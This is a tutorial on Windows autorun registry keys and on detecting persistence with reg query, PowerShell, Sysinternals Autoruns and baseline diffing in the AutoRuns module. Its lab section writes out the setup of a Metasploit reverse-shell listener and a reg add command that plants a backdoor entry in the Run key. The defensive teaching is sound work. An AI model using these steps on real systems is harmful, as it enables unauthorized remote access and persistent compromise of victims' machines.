# Windows Autoruns & Persistence Analysis

> A practical guide to understanding Windows autorun registry keys, detecting malware persistence, and performing baseline comparisons using both built-in tools and the PowerShell Autoruns module.


## 1. What Are Autorun Registry Keys?

When a user logs into a Windows machine, the operating system checks specific registry locations and automatically launches every program listed there. These are known as **autorun** or **persistence** locations, and they are one of the most commonly abused mechanisms by malware to survive reboots.

The primary key for the **current user** is:

```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Its machine-wide counterpart (applies to all users, requires admin rights) is:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### How it works

Each value stored under this key is a **name/data pair**:

| Value Name | Value Data |
|---|---|
| `OneDrive` | `"C:\Users\tcm\AppData\Local\Microsoft\OneDrive\OneDrive.exe"` |
| `Discord` | `"C:\Users\tcm\AppData\Local\Discord\Update.exe --processStart Discord.exe"` |

Every entry here will be executed automatically at login — no user interaction required. This is precisely why attackers target this location: a single registry entry is enough to re-establish a reverse shell every time the victim logs in.

---

## 2. RunOnce Keys

Alongside the `Run` key, Windows also provides **RunOnce** keys:

```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

The critical difference is in the name: **entries here are deleted automatically after they execute once**. This makes them ideal for:

- **Software installers** that need to run a finalization step after reboot
- **Windows Update** — post-patch cleanup tasks are often registered here
- **Self-deleting droppers** — malware may use RunOnce to deploy a second-stage payload while leaving no trace of the initial loader

Because these entries vanish after execution, they are harder to catch unless you monitor the registry in real time or capture a snapshot before the reboot.

> **Forensic note:** Even if a RunOnce entry has already been consumed, evidence may still exist in registry hive transaction logs (`.LOG` files) or Volume Shadow Copies.

---

## 3. Querying Autorun Keys via CMD

You do not need to open `regedit.exe` to inspect registry keys. The `reg query` command lets you read any key directly from the command line — useful for scripting, remote sessions, or simply avoiding the GUI.

**Syntax:**

```cmd
reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**Example output:**

```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

    MicrosoftEdgeAutoLaunch    REG_SZ    C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start
    OneDrive                   REG_SZ    "C:\Users\tcm\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
    Discord                    REG_SZ    C:\Users\tcm\AppData\Local\Discord\Update.exe --processStart Discord.exe
```

Each line shows:
- The **value name** (e.g., `MicrosoftEdgeAutoLaunch`)
- The **type** (`REG_SZ` = string)
- The **data** (the full path to the executable that will be launched)

To also query the machine-wide key (requires elevated privileges):

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

---

## 4. Querying Autorun Keys via PowerShell

PowerShell provides a more structured way to access the registry through the `Get-ItemProperty` cmdlet. The output is object-based, making it easier to filter, sort, and pipe into other commands.

```powershell
Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**Example output:**

```
MicrosoftEdgeAutoLaunch : C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window
OneDrive                : "C:\Users\tcm\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Discord                 : C:\Users\tcm\AppData\Local\Discord\Update.exe --processStart Discord.exe
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\...
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\...
PSChildName             : Run
PSDrive                 : HKCU
PSProvider              : Microsoft.PowerShell.Core\Registry
```

To query the machine-wide key:

```powershell
Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

> **Tip:** Pipe the output into `Select-Object` to clean up the PS metadata fields:
> ```powershell
> Get-ItemProperty -Path "Registry::HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" |
> Select-Object -Property * -ExcludeProperty PS*
> ```

---

## 5. Simulating Malware Persistence with Metasploit

The following section demonstrates how an attacker might establish persistence using a Meterpreter reverse shell. This is a **controlled lab simulation** intended for educational and defensive purposes only.

### 5.1 — Setting up the listener on Linux (Kali / Parrot)

Open a terminal and launch Metasploit:

```bash
msfconsole -q
```

Load the multi-handler exploit (a generic listener for any payload):

```bash
use exploit/multi/handler
```

Configure the payload — in this case a stageless reverse TCP shell:

```bash
set payload generic/shell_reverse_tcp
```

Set the listener's network interface (replace `enp0s3` with your actual interface name):

```bash
set LHOST enp0s3
set LPORT 4444
```

Start the listener:

```bash
exploit
```

Metasploit is now waiting for an incoming connection on port 4444.

### 5.2 — Executing the malware on Windows

On the Windows target machine, run the previously delivered payload:

```
malware.exe
```

As soon as the binary executes, a connection is established back to the Kali machine. Switch back to the Linux terminal — you now have an active shell session.

### 5.3 — Dropping into a shell session

From the Meterpreter prompt:

```bash
shell
```

You now have a Windows command prompt running in the context of the victim user. Navigate to the Downloads folder:

```cmd
cd C:\Users\tcm\Downloads
```

---

## 6. Adding a Backdoor to the Run Key

With shell access on the victim, the attacker registers a new autorun entry to ensure the malware re-executes every time the user logs in.

```cmd
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
    /v "notabackdoor" ^
    /t REG_SZ ^
    /d "C:\Users\tcm\Downloads\notmalware.exe"
```

**Parameter breakdown:**

| Parameter | Meaning |
|---|---|
| `/v "notabackdoor"` | The name of the registry value (visible in regedit) |
| `/t REG_SZ` | The type — a plain string |
| `/d "C:\Users\tcm\Downloads\notmalware.exe"` | The data — full path to the executable |

After adding this entry, every time the user logs in, `notmalware.exe` will be silently launched.

### Verifying the entry

**CMD:**

```cmd
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**PowerShell:**

```powershell
Get-ItemProperty -Path "Registry::HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

Both will now show `notabackdoor` in the list, pointing to `C:\Users\tcm\Downloads\notmalware.exe`.

---

## 7. Detecting Persistence — Sysinternals Autoruns

**Autoruns** by Sysinternals (now part of Microsoft) is the most comprehensive GUI tool available for visualizing everything that runs at startup — registry keys, scheduled tasks, services, browser extensions, boot sectors, and much more.

### Download

- Official: [https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- Run `Autoruns64.exe` for 64-bit systems (recommended), or `Autoruns.exe` for 32-bit

### What it shows

Autoruns color-codes entries to help analysts quickly spot anomalies:

| Color | Meaning |
|---|---|
| **Yellow** | File not found — the target binary is missing |
| **Red** | No valid digital signature |
| **White** | Normal, verified entry |
| **Pink/Light red** | Unsigned or suspicious |

Tabs are organized by category: `Logon`, `Explorer`, `Internet Explorer`, `Scheduled Tasks`, `Services`, `Drivers`, `Boot Execute`, etc.

> **Pro tip:** Enable *Options → Scan Options → Check VirusTotal.com* to automatically submit hashes of all autorun entries and display their VT detection scores directly in the UI.

---

## 8. Detecting Persistence — PowerShell Autoruns Module

For command-line and incident response workflows, the **p0w3rsh3ll/AutoRuns** PowerShell module is an excellent alternative to the Sysinternals GUI. It enumerates the same locations programmatically, making it scriptable, loggable, and diff-able.

**Repository:** [https://github.com/p0w3rsh3ll/AutoRuns](https://github.com/p0w3rsh3ll/AutoRuns)

This module is specifically designed for **incident response**, covering:
- Registry Run keys (HKCU & HKLM)
- Scheduled Tasks
- Services
- WMI subscriptions
- Browser extensions
- And many more persistence locations

### 8.1 — Setup

Navigate to the Downloads folder and list its contents to confirm the module is present:

```powershell
cd C:\Users\tcm\Downloads
dir
```

Allow script execution (required to import unsigned modules):

```powershell
Set-ExecutionPolicy Unrestricted
# When prompted, type Y and press Enter
```

Import the module:

```powershell
Import-Module .\AutoRuns.psm1
# If prompted about an untrusted publisher, type R (Run once) and press Enter
```

### 8.2 — Exploring the module

Verify the module loaded correctly:

```powershell
Get-Module
Get-Module -Name AutoRuns
```

List all available commands provided by the module:

```powershell
Get-Command -Module AutoRuns
```

This will display all exported functions, including:

- `Get-PSAutorun` — the main enumeration command
- `New-AutoRunsBaseLine` — saves the current state to a file
- `Compare-AutoRunsBaseLine` — diffs two saved states

### 8.3 — Running the enumeration

```powershell
Get-PSAutorun
```

Output columns include:

| Column | Description |
|---|---|
| `Path` | Registry key or file system path of the entry |
| `Item` | Name of the value or entry |
| `Category` | Type of persistence (e.g., `Run`, `Service`, `Task`) |
| `Value` | The executable or command that will run |
| `IsOSBinary` | Whether the binary is a signed Windows component |
| `ImagePath` | Full path to the binary on disk |

To read the full help documentation for `Get-PSAutorun`:

```powershell
Get-Help Get-PSAutorun -Detailed
# If asked to download help files, type Y
```

---

## 9. Baseline Snapshot & Diff Detection

The most powerful feature of the AutoRuns module for incident response is its ability to **capture a clean baseline** and then **compare it against a later state** to surface only what changed. This is the foundation of change-detection-based malware hunting.

### 9.1 — Capture the clean baseline

Create a dedicated folder and navigate into it:

```powershell
mkdir Baseline
cd Baseline
```

Capture the current autorun state, filtering out all legitimate OS binaries (which have valid Microsoft digital signatures), and save it to a file:

```powershell
Get-PSAutorun -VerifyDigitalSignature |
Where-Object { -not($_.IsOSBinary) } |
New-AutoRunsBaseLine -Verbose -FilePath .\Baseline.ps1
```

**What this does:**

- `Get-PSAutorun -VerifyDigitalSignature` — enumerates all persistence locations and verifies the digital signature of each binary
- `Where-Object { -not($_.IsOSBinary) }` — filters out entries whose binaries are signed by Microsoft (i.e., legitimate Windows components), reducing noise
- `New-AutoRunsBaseLine -FilePath .\Baseline.ps1` — serializes the filtered results to a `.ps1` file that acts as a snapshot

> This baseline represents the **known-good** state of the system. Store it somewhere safe.

### 9.2 — Execute the malware

At this point, simulate or trigger the malware execution on the system (e.g., run `notmalware.exe`). The backdoor now registers itself in the Run key.

### 9.3 — Capture the current state

After the malware has run, capture a second snapshot:

```powershell
Get-PSAutorun -VerifyDigitalSignature |
Where-Object { -not($_.IsOSBinary) } |
New-AutoRunsBaseLine -Verbose -FilePath .\CurrentState.ps1
```

This creates `CurrentState.ps1` — a snapshot of the system **after** infection.

### 9.4 — Compare baseline vs current state

```powershell
Compare-AutoRunsBaseLine `
    -ReferenceBaseLineFile .\Baseline.ps1 `
    -DifferenceBaseLineFile .\CurrentState.ps1 `
    -Verbose
```

**Output:** Only the **differences** between the two snapshots are shown. In this scenario, the output would highlight the newly added `notabackdoor` entry pointing to `C:\Users\tcm\Downloads\notmalware.exe` — revealing the malware's persistence mechanism immediately.

| Field | Baseline | Current State |
|---|---|---|
| `notabackdoor` | *(not present)* | `C:\Users\tcm\Downloads\notmalware.exe` |

This diff-based approach is significantly more efficient than manually reviewing hundreds of autorun entries, and scales well for automated threat hunting pipelines.

---

## 10. Summary & Key Takeaways

| Concept | Key Point |
|---|---|
| **Run key** | `HKCU\...\Run` — executes every entry at every login |
| **RunOnce key** | Same as Run, but entries self-delete after first execution |
| **reg query / Get-ItemProperty** | CLI alternatives to regedit for quick key inspection |
| **reg add** | Attackers use this to register persistence with a single command |
| **Sysinternals Autoruns** | Best GUI tool for full-system autorun visibility |
| **p0w3rsh3ll/AutoRuns** | PowerShell module for scriptable, incident-response-grade enumeration |
| **Baseline diffing** | Capture before/after snapshots and compare — only anomalies surface |

### Defensive recommendations

- **Monitor the Run keys** with a SIEM or EDR — any new unsigned entry should trigger an alert
- **Restrict execution policy** and log all PowerShell activity via `ScriptBlockLogging`
- **Regularly baseline** critical systems and diff against current state
- **Use application whitelisting** (e.g., AppLocker or WDAC) to prevent unsigned binaries from executing from user-writable paths like `Downloads`
- **Enable Authenticode verification** — binaries without valid signatures in Run keys are a major red flag

---
